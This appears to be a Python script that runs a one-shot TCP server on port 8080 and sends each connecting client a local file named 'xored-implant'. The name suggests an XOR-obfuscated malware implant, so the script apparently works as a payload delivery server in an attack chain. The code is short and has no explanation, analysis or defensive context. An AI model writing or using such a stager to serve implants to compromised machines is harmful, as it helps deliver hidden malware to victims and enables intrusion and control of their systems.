import socket

PORT=8080
HOST=''

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with open("xored-implant", 'rb') as f:
        with conn:
            print('Connected by', addr)
            conn.sendfile(f)
            conn.close()
    s.close()
